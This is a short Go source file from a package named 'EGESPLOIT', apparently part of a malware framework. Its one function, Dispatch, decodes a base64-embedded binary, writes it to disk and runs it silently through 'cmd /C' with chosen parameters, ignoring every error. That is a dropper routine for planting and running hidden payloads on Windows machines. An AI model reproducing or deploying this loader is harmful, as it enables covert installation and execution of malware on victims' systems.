package EGESPLOIT




import "encoding/base64"
import "os/exec"
import "os"

func Dispatch(B64_Binary string, BinaryName string, Parameters string) {

  Binary, _ := os.Create(BinaryName)

  DecodedBinary, _ := base64.StdEncoding.DecodeString(B64_Binary)

  Binary.WriteString(string(DecodedBinary));

  Binary.Close()

  Command := string(BinaryName + " " + Parameters)

  Exec := exec.Command("cmd", "/C", Command);
  Exec.Start();
}